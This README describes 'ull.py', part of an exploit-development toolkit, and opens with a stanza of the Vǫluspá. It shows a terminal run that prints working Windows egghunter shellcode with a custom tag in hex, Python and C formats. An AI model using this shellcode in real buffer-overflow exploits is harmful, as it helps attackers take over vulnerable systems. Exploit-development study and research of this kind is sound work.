<center>
The brothers fight 
and will put to death,
Parents will sully
Their own layer;

Harsh times in the world,
Universal Adultery,
Time of axes, time of swords,
Shields are split,
Storm times, wolf times,
Before the world collapses;

No one 
will spare anyone

--Vǫluspá 45.
</center>
</br>
</br>



# Collection of tools for exploit development purposes

----------

### **ull.py  -  The hunter god**
He will create an egghunter with your desired tag.

> Example:
```
root@kali:/opt/valhalla# python ull.py Amon
[*] Your tag: Amon
[+] Hexadecimal format: 
6681caff0f42526a0258cd2e3c055a74efb8416d6f6e8bfaaf75eaaf75e7ffe7

[+] Python format: 
egghunter = ''
egghunter += '\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58'
egghunter += '\xcd\x2e\x3c\x05\x5a\x74\xef\xb8'
egghunter += '\x41\x6d\x6f\x6e'
egghunter += '\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

[+] C format: 
unsigned char shellcode[] = \''
"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58"
"\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
"\x41\x6d\x6f\x6e"
"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";

root@kali:/opt/valhalla#
```